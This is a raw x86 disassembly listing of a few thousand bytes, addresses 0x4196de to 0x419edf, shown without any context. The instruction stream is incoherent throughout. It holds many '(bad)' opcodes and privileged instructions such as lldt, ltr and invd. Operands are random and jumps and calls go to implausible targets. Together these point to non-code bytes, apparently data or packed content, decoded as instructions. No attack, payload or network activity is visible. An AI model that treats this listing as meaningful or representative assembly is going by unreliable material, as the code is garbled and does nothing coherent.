  4196de:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4196e5:	retf   0x83fc
  4196e8:	into   
  4196e9:	dec    ebp
  4196ea:	retf   
  4196eb:	mov    ecx,DWORD PTR [ebp-0x74]
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	fdiv   QWORD PTR [ebx]
  4196f2:	mov    bh,0x3
  4196f4:	push   es
  4196f5:	mov    esi,ecx
  4196f7:	sbb    cl,dl
  4196f9:	dec    ebp
  4196fa:	sar    DWORD PTR [ebx],cl
  4196fc:	push   ebp
  4196fd:	jne    0x41970e
  4196ff:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  419705:	lea    ebx,[eax]
  419707:	call   0xf4cb22ce
  41970c:	sbb    dh,dl
  41970e:	add    edx,ebx
  419710:	push   ebp
  419711:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  419717:	push   ecx
  419718:	mov    DWORD PTR [eax-0x30],edx
  41971b:	test   DWORD PTR [edx],eax
  41971d:	xadd   esp,esi
  419720:	pop    es
  419721:	add    cl,dl
  419723:	mov    eax,ecx
  419725:	or     al,0x45
  419727:	(bad)  
  419728:	push   eax
  419729:	add    DWORD PTR [edx+0x0],eax
  41972c:	add    ecx,DWORD PTR [ecx]
  41972e:	and    dh,cl
  419730:	call   0xc5a000
  419735:	add    DWORD PTR [ebp+0x0],edx
  419738:	mov    esp,DWORD PTR [ebp+0x18]
  41973b:	add    BYTE PTR [eax+0x54],cl
  41973e:	xor    eax,DWORD PTR [eax]
  419740:	add    esp,DWORD PTR [esi+0x3b]
  419743:	inc    ebp
  419744:	je     0x4196c9
  419746:	push   ecx
  419747:	cli    
  419748:	dec    ebp
  419749:	mov    DWORD PTR [ebx],eax
  41974b:	(bad)  
  41974c:	or     al,0x5e
  41974e:	inc    eax
  41974f:	add    BYTE PTR [ebx],al
  419751:	data16 and BYTE PTR [ebp+0x50],al
  419755:	sub    DWORD PTR [ecx],0xfffffff8
  419758:	add    BYTE PTR [ebp-0x75],ah
  41975b:	add    BYTE PTR [eax],bl
  41975d:	enter  0x894d,0x8b
  419761:	int3   
  419762:	loopne 0x419726
  419764:	rol    BYTE PTR [eax],0x33
  419767:	lea    cx,[ebp+0xa]
  41976b:	data16 jb 0x4197b3
  41976e:	add    BYTE PTR [ebx+0x44890855],cl
  419774:	sbb    ah,al
  419776:	inc    ebp
  419777:	lldt   WORD PTR ds:[edx+0x66]
  41977c:	xor    ecx,DWORD PTR [eax]
  41977e:	sub    eax,DWORD PTR [ebx+ecx*4]
  419781:	add    BYTE PTR [esi+eiz*2],cl
  419784:	ror    edx,cl
  419786:	dec    ebp
  419787:	inc    ebp
  419788:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  41978e:	cld    
  41978f:	or     BYTE PTR [edi+0x4501dd],dl
  419795:	(bad)  
  419796:	into   
  419797:	out    dx,al
  419798:	retf   
  419799:	(bad)  
  41979a:	dec    ebp
  41979b:	mov    al,0x8b
  41979d:	loop   0x4197bf
  41979f:	cmp    ecx,DWORD PTR [edx]
  4197a1:	inc    ebp
  4197a2:	daa    
  4197a3:	loop   0x41972c
  4197a5:	out    dx,al
  4197a6:	add    edi,eax
  4197a8:	add    BYTE PTR [eax+0x3f52e155],bh
  4197ae:	push   ebp
  4197af:	inc    ebp
  4197b0:	xor    ebx,esp
  4197b2:	add    ebp,esi
  4197b4:	push   edx
  4197b5:	push   bp
  4197b7:	inc    ebp
  4197b8:	(bad)  
  4197b9:	in     eax,dx
  4197ba:	push   esp
  4197bb:	(bad)  
  4197bc:	inc    edx
  4197be:	sbb    al,0x33
  4197c0:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4197c7:	add    BYTE PTR [ebp+0x47],0x8b
  4197cb:	jmp    0xf98b:0x100041c8
  4197d2:	xor    esi,DWORD PTR [edx+0x3]
  4197d5:	mov    ecx,DWORD PTR [edi]
  4197d7:	fmul   DWORD PTR [edx]
  4197d9:	add    BYTE PTR [eax],al
  4197db:	lea    eax,[ebx-0x4700273c]
  4197e1:	add    al,0x4f
  4197e3:	pop    DWORD PTR [eax]
  4197e5:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4197eb:	push   edx
  4197ec:	inc    WORD PTR [ebp+0x8]
  4197f0:	mov    eax,0x514f4d
  4197f5:	(bad)
  4197f9:	add    al,al
  4197fb:	xor    DWORD PTR [ebx-0x74baf730],eax
  419801:	test   DWORD PTR [esi+0x74],esp
  419804:	inc    ebp
  419805:	mov    DWORD PTR [eax+0xa4e08],edi
  41980b:	add    BYTE PTR [ecx-0x76c435bb],cl
  419811:	or     dh,cl
  419813:	or     eax,0x8b8d5045
  419818:	inc    ebp
  419819:	mov    WORD PTR [ecx+0x3b8a00],?
  41981f:	jne    0x419854
  419821:	mov    edi,DWORD PTR [edx+0x8f3b18]
  419827:	add    DWORD PTR [ebx],eax
  419829:	add    bh,bh
  41982b:	adc    DWORD PTR [eax],ecx
  41982d:	adc    DWORD PTR [ebp+0x55],edi
  419830:	push   es
  419831:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  419837:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  41983e:	inc    ebp
  41983f:	mov    esp,edi
  419841:	or     al,0xdc
  419843:	push   eax
  419844:	(bad)  
  419845:	jne    0x4197fb
  419847:	call   0x399138
  41984c:	inc    ebp
  41984d:	sar    BYTE PTR [edx],0x84
  419850:	out    dx,al
  419851:	add    bh,al
  419853:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41985a:	(bad)  
  41985b:	and    al,al
  41985d:	fs in  eax,dx
  41985f:	inc    DWORD PTR [ebp-0x7b]
  419862:	jo     0x419873
  419864:	leave  
  419865:	scas   al,BYTE PTR es:[edi]
  419866:	inc    esp
  419867:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41986e:	or     BYTE PTR [ebx-0x97717c9],0x83
  419875:	call   DWORD PTR [edi]
  419877:	shr    ah,0x84
  41987a:	xchg   DWORD PTR [eax],eax
  41987c:	add    DWORD PTR [eax],eax
  41987e:	add    bh,bh
  419880:	dec    ebp
  419881:	and    BYTE PTR [ecx-0x38],dl
  419884:	push   eax
  419885:	dec    DWORD PTR [ebx+0xfd885]
  41988b:	mov    BYTE PTR [ebp+0x508bac00],cl
  419891:	mov    WORD PTR [ecx+0x0],ss
  419894:	lea    ecx,[ebx+0x108b20d8]
  41989a:	mov    WORD PTR [edx],ds
  41989c:	add    BYTE PTR [edi+0xff01ff],al
  4198a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4198a5:	push   ecx
  4198a6:	shl    BYTE PTR [ebp+0x3a],0x8b
  4198aa:	inc    ebp
  4198ab:	in     al,0xeb
  4198ad:	jno    0x41983a
  4198af:	push   edx
  4198b0:	mov    DWORD PTR [eax-0x28],edx
  4198b3:	mov    eax,DWORD PTR [ebp+0x20]
  4198b6:	je     0x41983f
  4198b8:	mov    eax,DWORD PTR [ecx]
  4198ba:	sbb    BYTE PTR [eax],al
  4198bc:	pop    DWORD PTR [eax]
  4198be:	add    esi,eax
  4198c0:	add    bl,al
  4198c2:	adc    DWORD PTR [edi],esi
  4198c4:	jmp    0x8bcce916
  4198c9:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4198d0:	jne    0x41985d
  4198d2:	mov    ecx,DWORD PTR [eax]
  4198d4:	in     al,0x75
  4198d6:	pop    DWORD PTR [ecx+0x5501]
  4198dc:	push   edx
  4198dd:	inc    DWORD PTR [ebx]
  4198df:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4198e5:	add    BYTE PTR [edi+0x9],dl
  4198e8:	call   DWORD PTR [esi]
  4198ea:	and    dl,al
  4198ec:	and    bh,bh
  4198ee:	inc    edi
  4198f0:	test   eax,edx
  4198f2:	sldt   ebx
  4198f5:	xor    BYTE PTR [eax],al
  4198f7:	pushf  
  4198f8:	(bad)  
  4198f9:	jmp    0x419907
  4198fb:	mov    eax,edi
  4198fd:	or     al,0x75
  4198ff:	inc    eax
  419900:	call   0x419008
  419905:	mov    eax,eax
  419907:	loopne 0x41988d
  419909:	inc    ebp
  41990a:	add    BYTE PTR [ebx+0x1451c00],cl
  419910:	mov    eax,DWORD PTR [ebp+0x20]
  419913:	add    edi,ecx
  419915:	add    BYTE PTR [eax],ch
  419917:	cmp    edi,0x18
  41991a:	test   DWORD PTR [ebp+0xf],esi
  41991d:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  419924:	jne    0x419928
  419926:	call   0xffa093eb
  41992b:	leave  
  41992c:	rcr    BYTE PTR [esp+eax*4],0x55
  419930:	add    ah,ch
  419932:	add    BYTE PTR [edi-0x48fef979],dh
  419938:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41993f:	inc    esp
  419940:	mov    ebx,DWORD PTR [eax]
  419942:	fcom   st(2)
  419944:	add    BYTE PTR [edi],bl
  419946:	lea    ecx,[eax-0x18]
  419949:	(bad)  
  41994a:	push   DWORD PTR [ecx]
  41994c:	call   0xffb3e6ae
  419951:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  419955:	fstp   DWORD PTR [esi+ebx*8]
  419958:	push   ebp
  419959:	pop    ebp
  41995a:	mov    esi,DWORD PTR [edx-0x38]
  41995d:	add    DWORD PTR [eax],0x28
  419960:	mov    edi,DWORD PTR [ebx]
  419962:	xor    esi,DWORD PTR [edx+0x3]
  419965:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  419969:	pop    ebp
  41996a:	or     al,0x4
  41996c:	inc    ecx
  41996d:	push   ebp
  41996e:	(bad)  
  41996f:	in     al,dx
  419970:	or     ah,ch
  419972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419973:	xbegin 0xffc70f69
  419979:	clc    
  41997a:	adc    al,0x45
  41997c:	div    BYTE PTR [eax]
  41997e:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  419985:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  41998c:	jno    0x4199f4
  41998e:	add    eax,DWORD PTR [ebp+0x52]
  419991:	adc    eax,0xffffffa0
  419994:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  41999a:	test   DWORD PTR [eax],eax
  41999c:	clc    
  41999d:	data16 or al,BYTE PTR [ebp+0x45]
  4199a1:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4199a8:	rol    BYTE PTR [ebp+0x45],1
  4199ab:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4199b1:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4199b7:	push   ebx
  4199b8:	add    BYTE PTR [ebp+0x0],dl
  4199bb:	push   ecx
  4199bc:	jge    0x4199f1
  4199be:	add    BYTE PTR [esi+0x4],dl
  4199c1:	jne    0x419a28
  4199c3:	mov    edx,0x457200
  4199c8:	jmp    0x41998c
  4199ca:	xor    edi,DWORD PTR [ebx]
  4199cc:	pop    edi
  4199cd:	cvtdq2ps xmm7,xmm0
  4199d0:	ret    0x0
  4199d3:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4199d9:	xor    ecx,DWORD PTR [edi]
  4199db:	add    eax,DWORD PTR [ecx+0x3b]
  4199de:	push   ebx
  4199df:	rdpmc  
  4199e1:	out    0x8d,al
  4199e3:	add    BYTE PTR [eax],cl
  4199e5:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4199eb:	ret    0x450c
  4199ee:	sbb    al,0x8b
  4199f0:	cmp    eax,esi
  4199f2:	or     cl,al
  4199f4:	or     al,0xc2
  4199f6:	pop    eax
  4199f7:	inc    ebp
  4199f8:	add    ecx,DWORD PTR [edi]
  4199fa:	add    esi,DWORD PTR [ebp+0x39]
  4199fd:	invd   
  4199ff:	jge    0x419a0b
  419a01:	mov    eax,0x478ac0
  419a06:	cli    
  419a07:	xor    esp,ecx
  419a09:	mov    ebx,0x5b8ac0
  419a0e:	ret    0x33
  419a11:	mov    eax,0x833b8b
  419a16:	sub    BYTE PTR [ebx],al
  419a18:	inc    ebp
  419a19:	xor    ax,di
  419a1c:	pushf  
  419a1d:	inc    bh
  419a1f:	mov    esp,esp
  419a21:	hlt    
  419a22:	test   DWORD PTR [ebp-0x8],esi
  419a25:	mov    eax,DWORD PTR [ebp-0x14]
  419a28:	xor    ecx,DWORD PTR [ebx-0x76478864]
  419a2e:	dec    edi
  419a2f:	or     BYTE PTR [eax],al
  419a31:	jne    0x4199bc
  419a33:	mov    esi,esp
  419a35:	call   0x77a825fa
  419a3a:	inc    ebp
  419a3b:	mov    DWORD PTR [eax+0x9c4f0c],edi
  419a41:	add    BYTE PTR [ecx-0x3ffe0717],cl
  419a47:	add    BYTE PTR [esi+0x7d],ah
  419a4a:	inc    ebp
  419a4b:	mov    bx,WORD PTR [ebp+0x8]
  419a4f:	add    DWORD PTR [ebp+0x55],0x30c008b
  419a56:	inc    ebp
  419a57:	mov    bx,di
  419a5a:	lock test BYTE PTR [ecx+0x7000801],bh
  419a61:	jge    0x419a24
  419a63:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  419a69:	cli    
  419a6a:	xor    bl,bh
  419a6c:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  419a72:	test   BYTE PTR [eax],cl
  419a74:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  419a7b:	cmp    ebp,eax
  419a7d:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  419a84:	test   BYTE PTR [ebp+0x1],bh
  419a87:	mov    ebx,0x458a00
  419a8c:	xor    esi,DWORD PTR [ebx]
  419a8e:	add    esp,DWORD PTR [esi-0x77]
  419a91:	pop    ebp
  419a92:	loopne 0x419afa
  419a94:	inc    ebp
  419a95:	clc    
  419a96:	xor    edi,DWORD PTR [ebx]
  419a98:	add    esi,DWORD PTR [edx-0x77]
  419a9b:	data16 fdivr QWORD PTR [ebp-0x49]
  419a9f:	mov    ebx,0xb78afc
  419aa4:	hlt    
  419aa5:	xor    edi,DWORD PTR [esi]
  419aa7:	data16 add BYTE PTR [ebp+0x66],bl
  419aab:	data16 lock clc 
  419aae:	cmp    eax,DWORD PTR ds:[eax]
  419ab1:	ja     0x419b19
  419ab3:	psubq  mm7,QWORD PTR [ebp+0x4]
  419ab7:	ltr    WORD PTR [ebp+0x66]
  419abb:	add    esi,eax
  419abd:	add    di,WORD PTR [ebp+0x2b]
  419ac1:	data16 data16 jge 0x419b42
  419ac5:	mov    ebx,0xe08a8b
  419aca:	jge    0x419aff
  419acc:	data16 data16 xor al,0x5d
  419ad0:	data16 data16 jne 0x419acc
  419ad4:	mov    edi,DWORD PTR [ebx]
  419ad6:	fdiv   QWORD PTR [edx+0x7d]
  419ad9:	data16 data16 jge 0x419b11
  419add:	mov    ebx,0x758a66
  419ae2:	mov    esi,0x667233
  419ae7:	pop    ebp
  419ae8:	or     BYTE PTR [esi+0x0],ah
  419aeb:	clc    
  419aec:	mov    edi,DWORD PTR [ebx]
  419aee:	lock ja 0x419a7c
  419af1:	(bad)  
  419af3:	jge    0x419aec
  419af5:	invd   
  419af7:	pop    ebp
  419af8:	add    BYTE PTR [ebx],al
  419afa:	(bad)  
  419afb:	cmp    di,WORD PTR [ebp+0xf]
  419aff:	data16 sbb bh,BYTE PTR [ebp+0x0]
  419b03:	mov    bx,WORD PTR [ebp-0x10]
  419b07:	pop    bp
  419b09:	fbstp  TBYTE PTR [ebx]
  419b0b:	test   DWORD PTR [ebx],eax
  419b0d:	add    BYTE PTR [ebx],bh
  419b0f:	add    BYTE PTR [esi+0x7d],ah
  419b12:	jge    0x419a9f
  419b14:	data16 in al,dx
  419b16:	pop    ebp
  419b17:	stc    
  419b18:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  419b1f:	mov    edi,ebx
  419b21:	in     al,dx
  419b22:	test   BYTE PTR [ebp+0x0],bh
  419b25:	mov    eax,DWORD PTR [eax]
  419b27:	call   0xbd3e94b7
  419b2c:	ds pushf 
  419b2e:	add    BYTE PTR [edx],dh
  419b30:	mov    bx,di
  419b33:	call   0x8b4a18c3
  419b38:	add    ebp,esp
  419b3a:	mov    bx,di
  419b3d:	jnp    0x419b65
  419b3f:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  419b45:	mov    eax,DWORD PTR [eax]
  419b47:	call   0x7c3d26b2
  419b4c:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  419b52:	data16 data16 fistp WORD PTR [ebp+0xe]
  419b57:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  419b61:	fisttp WORD PTR [ecx-0x7401f77b]
  419b67:	(bad)  
  419b68:	cld    
  419b69:	jne    0x419ba9
  419b6b:	xor    eax,DWORD PTR [eax]
  419b6d:	mov    esp,DWORD PTR [esi-0x10]
  419b70:	sti    
  419b71:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  419b78:	data16 adc bl,bh
  419b7b:	push   ebp
  419b7c:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  419b83:	mov    WORD PTR [eax],es
  419b85:	pushf  
  419b86:	data16 xor bh,bl
  419b89:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  419b8f:	mov    esp,DWORD PTR [esi-0x14]
  419b92:	fisttp WORD PTR [ebx-0x3748a9f2]
  419b98:	or     al,0x2b
  419b9a:	mov    bh,0xba
  419b9c:	hlt    
  419b9d:	mov    bh,bl
  419b9f:	add    BYTE PTR [ecx-0x7446f3cd],cl
  419ba5:	dec    esi
  419ba6:	or     al,0x0
  419ba8:	mov    edi,DWORD PTR [ebx]
  419baa:	or     BYTE PTR [ebp+0x3b],dh
  419bad:	mov    ecx,DWORD PTR [edi]
  419baf:	fdivr  QWORD PTR [ebx-0x7499ff83]
  419bb5:	xor    al,0xd8
  419bb7:	pop    bp
  419bb9:	lock xor esi,DWORD PTR [ebx]
  419bbc:	lea    esp,[esi+0x1f]
  419bbf:	icebp  
  419bc0:	jb     0x419bc6
  419bc2:	add    al,al
  419bc4:	jge    0x419bd2
  419bc6:	mov    eax,eax
  419bc8:	fsubr  st,st(3)
  419bca:	pop    ebp
  419bcb:	mov    esi,DWORD PTR [ebx]
  419bcd:	in     al,0x8d
  419bcf:	rcr    DWORD PTR [edi],0xc2
  419bd2:	jb     0x419c32
  419bd4:	add    cl,cl
  419bd6:	jge    0x419be4
  419bd8:	mov    edx,DWORD PTR [ebp-0x20]
  419bdb:	in     al,dx
  419bdc:	pop    ebp
  419bdd:	data16 data16 or BYTE PTR [esi+edi*4],bh
  419be2:	cmp    di,WORD PTR [ebp+0x0]
  419be6:	mov    ebp,DWORD PTR [ebx]
  419be8:	fdivr  QWORD PTR [esi+0x668a5d]
  419bee:	cmp    al,0x33
  419bf0:	mov    si,0x4e7d
  419bf4:	mov    eax,DWORD PTR [eax]
  419bf6:	lock inc ebp
  419bf8:	mov    esi,DWORD PTR [esi]
  419bfa:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  419c01:	clc    
  419c02:	(bad)  
  419c03:	cmp    edi,DWORD PTR [ebx]
  419c05:	je     0x419c16
  419c07:	push   ebx
  419c08:	loopne 0x419c19
  419c0a:	dec    ecx
  419c0c:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  419c10:	icebp  
  419c11:	mov    esi,0x703084d
  419c16:	pcmpgtd mm6,mm1
  419c19:	add    BYTE PTR [ebp+0x66],dh
  419c1c:	jmp    0x419be9
  419c1e:	mov    eax,DWORD PTR [ebx]
  419c20:	lock push ebp
  419c22:	ror    DWORD PTR [ebp-0x2972feb3],1
  419c28:	or     bh,dl
  419c2a:	jb     0x419c2a
  419c2c:	add    BYTE PTR [ebx-0x1a7487b3],cl
  419c32:	loopne 0x419c34
  419c34:	jne    0x419c3a
  419c36:	data16 add BYTE PTR [esi+eiz*2],dh
  419c3a:	mov    ecx,ebx
  419c3c:	data16 ds icebp 
  419c3f:	add    BYTE PTR [esi],bh
  419c41:	data16 add bl,cl
  419c44:	retw   0xf2
  419c48:	ret    0x66
  419c4b:	retf   
  419c4c:	enterw 0x4df1,0x19
  419c51:	pop    edi
  419c52:	jne    0x419bd5
  419c54:	mov    esi,DWORD PTR [esi]
  419c56:	call   0x77b627f7
  419c5b:	xor    ebp,DWORD PTR [ebx]
  419c5d:	lea    esp,[esi+0x48]
  419c60:	repnz in eax,0x3b
  419c63:	add    BYTE PTR [ebp-0x37],dh
  419c66:	xor    edx,DWORD PTR [ebp-0x15]
  419c69:	in     al,dx
  419c6a:	xor    edx,DWORD PTR [esi+0x40]
  419c6d:	mov    DWORD PTR [edi],0x338545fc
  419c73:	clc    
  419c74:	add    esi,DWORD PTR [ecx]
  419c76:	pop    edi
  419c77:	pushf  
  419c78:	pop    ebx
  419c79:	call   0xff429c40
  419c7e:	mov    edi,eax
  419c80:	push   ecx
  419c81:	pop    es
  419c82:	mov    esi,DWORD PTR [edi]
  419c84:	push   esi
  419c85:	inc    edi
  419c86:	add    al,0x70
  419c88:	add    BYTE PTR [ecx+0x66],ah
  419c8b:	(bad)  
  419c8c:	into   
  419c8d:	fs ds int 0x0
  419c91:	mov    ecx,0x7ce0866
  419c96:	ret    0x66
  419c99:	add    bh,al
  419c9b:	add    al,0xfc
  419c9d:	add    BYTE PTR [ebp+0x31c3f866],al
  419ca3:	ds pushf 
  419ca5:	add    BYTE PTR [esi+0x66],ah
  419ca8:	into   
  419ca9:	ret    
  419caa:	pop    ebp
  419cab:	adc    al,0x57
  419cad:	add    BYTE PTR [edi-0x723c409a],dh
  419cb3:	add    edi,edi
  419cb5:	jne    0x419d0c
  419cb7:	lea    edx,[ecx+0x1]
  419cba:	mov    ebx,0xd64ff1
  419cbf:	sar    DWORD PTR [ebx],1
  419cc1:	test   BYTE PTR [ebp+0x38],dh
  419cc4:	mov    DWORD PTR [esp+edi*8-0x76],esp
  419cc8:	push   edi
  419cc9:	xor    BYTE PTR [ebx],0x37
  419ccc:	mov    esi,ebx
  419cce:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  419cd4:	cmp    BYTE PTR [ebp+0x64],al
  419cd7:	pop    ebx
  419cd8:	mov    ebx,0x9c3b36
  419cdd:	je     0x419d0a
  419cdf:	xor    edi,DWORD PTR [ebx+0x668a33]
  419ce5:	mov    WORD PTR [ebx],?
  419ce7:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  419ced:	pop    edi
  419cee:	cmp    ecx,ecx
  419cf0:	jne    0x419d47
  419cf2:	mov    ebp,esp
  419cf4:	cld    
  419cf5:	push   esi
  419cf6:	pop    ebx
  419cf7:	inc    ebp
  419cf8:	stc    
  419cf9:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  419d01:	clc    
  419d02:	test   dl,dl
  419d04:	cmp    bh,bh
  419d06:	fs pop si
  419d09:	or     bl,al
  419d0b:	add    al,0x8b
  419d0d:	add    BYTE PTR [ecx+0x66],dl
  419d10:	push   edi
  419d11:	retf   0x3e45
  419d14:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  419d1c:	clc    
  419d1d:	add    BYTE PTR [ebx+0x66],bl
  419d20:	dec    edx
  419d22:	mov    edx,DWORD PTR [edi-0x76]
  419d25:	push   edi
  419d26:	add    al,0xb7
  419d28:	xor    al,0xba
  419d2a:	cmp    al,0x8d
  419d2c:	je     0x419d2d
  419d2e:	mov    edx,DWORD PTR [ebp-0x46]
  419d31:	push   ecx
  419d32:	lea    edi,[ebx+0x554fff]
  419d38:	push   ecx
  419d39:	cmp    edx,DWORD PTR [ebx+0x75]
  419d3c:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  419d42:	add    BYTE PTR [ebx],dh
  419d44:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  419d4a:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  419d51:	mov    ebx,0x3b3b00
  419d56:	jne    0x419d83
  419d58:	mov    DWORD PTR [ebx+0x728afc],edi
  419d5e:	xor    esi,DWORD PTR [ebx]
  419d60:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  419d66:	push   edi
  419d67:	cmp    esp,ebp
  419d69:	jne    0x419d6b
  419d6b:	sbb    DWORD PTR [eax],0x8085c3fc
  419d71:	clc    
  419d72:	inc    edi
  419d73:	pop    ebx
  419d74:	sti    
  419d75:	add    eax,0xeb8bc075
  419d7a:	cld    
  419d7b:	xor    edi,DWORD PTR ds:0xf8c3855e
  419d81:	mov    ecx,DWORD PTR [ecx+edx*2]
  419d84:	rol    DWORD PTR [ebp-0x37],0xf
  419d88:	mov    DWORD PTR [eax],ecx
  419d8a:	inc    edi
  419d8b:	(bad)  
  419d8c:	in     eax,0xfc
  419d8e:	add    bh,bh
  419d90:	(bad)  
  419d91:	mov    esi,0xc38a5e
  419d96:	mov    esi,DWORD PTR [ebx]
  419d98:	push   ecx
  419d99:	mov    edi,0xfc4ec7
  419d9e:	test   DWORD PTR [ebp-0x8],edx
  419da1:	xor    di,ax
  419da4:	pushf  
  419da5:	sub    ebp,eax
  419da7:	inc    ebp
  419da8:	(bad)  
  419da9:	sub    edi,edi
  419dab:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  419db1:	inc    ebp
  419db2:	add    BYTE PTR [esi+0x2b],ah
  419db5:	or     bh,BYTE PTR [edx+0xf8ac2]
  419dbb:	cmp    al,0x33
  419dbd:	mov    edi,DWORD PTR [edx+0xfc4e81]
  419dc3:	(bad)  
  419dc4:	cmp    esi,DWORD PTR [ebx]
  419dc6:	je     0x419d80
  419dc8:	push   ebx
  419dc9:	dec    esi
  419dca:	str    ecx
  419dcd:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  419dd1:	xor    edi,DWORD PTR [edi+0x789085f]
  419dd7:	mov    edx,DWORD PTR [esp+edi*8]
  419dda:	add    cl,cl
  419ddc:	data16 add al,0xcb
  419ddf:	push   ebp
  419de0:	add    ebp,esp
  419de2:	jne    0x419dd0
  419de4:	(bad)  
  419de5:	mov    DWORD PTR [ecx],0xd685f7ec
  419deb:	clc    
  419dec:	xlat   BYTE PTR ds:[ebx]
  419ded:	inc    ebp
  419dee:	mov    esi,DWORD PTR [eax]
  419df0:	push   eax
  419df1:	pushf  
  419df2:	in     eax,0x8b
  419df4:	add    ah,ch
  419df6:	add    al,0x55
  419df8:	add    BYTE PTR [ecx+0x66],dl
  419dfb:	add    eax,0x3e72cb
  419e00:	add    BYTE PTR [ebp+0x66],al
  419e03:	(bad)  
  419e04:	retf   
  419e05:	lock ret 0x85
  419e09:	clc    
  419e0a:	inc    bp
  419e0c:	retf   
  419e0d:	cmp    eax,0xc77d9cc8
  419e12:	ss cld 
  419e14:	pushf  
  419e15:	test   DWORD PTR [edi-0x8],ebx
  419e18:	je     0x419e5f
  419e1a:	xor    esi,DWORD PTR ds:0x7020840
  419e20:	ror    BYTE PTR [ebp-0x37],0x8d
  419e24:	push   ebp
  419e25:	add    esp,ebp
  419e27:	jb     0x419db4
  419e29:	add    BYTE PTR [eax],cl
  419e2b:	dec    ebp
  419e2c:	mov    bh,0x81
  419e2e:	push   esi
  419e2f:	push   ebp
  419e30:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  419e37:	xor    al,BYTE PTR [eax]
  419e39:	mov    edx,DWORD PTR [edi+0x10]
  419e3c:	(bad)  
  419e3d:	scas   eax,DWORD PTR es:[edi]
  419e3e:	ret    0x3b
  419e41:	jns    0x3b429b34
  419e47:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  419e4b:	dec    ebp
  419e4c:	or     BYTE PTR [ebx],ch
  419e4e:	ret    0x458b
  419e51:	lock jmp 0x419e45
  419e54:	mov    ecx,DWORD PTR [eax]
  419e56:	or     BYTE PTR [edi],al
  419e58:	mov    ecx,eax
  419e5a:	xor    DWORD PTR [edx+0x2],0x0
  419e5e:	mov    bh,0xc1
  419e60:	adc    BYTE PTR [eax],dh
  419e62:	iret   
  419e63:	inc    ebp
  419e64:	mov    DWORD PTR [ebx],0x4dfff8c4
  419e6a:	inc    BYTE PTR [ebx]
  419e6c:	ret    0xf8
  419e6f:	adc    DWORD PTR [esi+0x10],esp
  419e72:	clc    
  419e73:	dec    ecx
  419e74:	fisttp WORD PTR [ecx+0x456604c0]
  419e7a:	add    dh,BYTE PTR ds:0x75e0845
  419e80:	ret    0x4d
  419e83:	lea    ecx,[ebx+0x18728301]
  419e89:	add    BYTE PTR [ebp+0x45],al
  419e8c:	xor    ecx,ebp
  419e8e:	pushf  
  419e8f:	add    bh,al
  419e91:	add    al,ch
  419e93:	inc    ebp
  419e94:	test   DWORD PTR [ebx-0x3eba0708],ecx
  419e9a:	xor    eax,0x781084d
  419e9f:	push   ebp
  419ea0:	pushf  
  419ea1:	push   ecx
  419ea2:	xor    al,BYTE PTR [ecx+0x32f89c89]
  419ea8:	inc    ebp
  419ea9:	cmp    edi,DWORD PTR [ecx]
  419eab:	jbe    0x419e49
  419ead:	mov    eax,edi
  419eaf:	or     ah,dh
  419eb1:	inc    ebp
  419eb2:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  419eb8:	xor    ecx,DWORD PTR [ebx-0x74747664]
  419ebe:	in     al,dx
  419ebf:	hlt    
  419ec0:	push   ebp
  419ec1:	push   ebp
  419ec2:	push   ecx
  419ec3:	push   ecx
  419ec4:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  419eca:	pushf  
  419ecb:	pushf  
  419ecc:	xor    dh,BYTE PTR [edx]
  419ece:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  419ed4:	or     BYTE PTR [ebp+0x7],al
  419ed7:	mov    eax,ecx
  419ed9:	clc    
  419eda:	jb     0x419e9d
  419edc:	add    BYTE PTR [ebp+0x55],cl
  419edf:	or     DWORD PTR [edi],0xc251d155
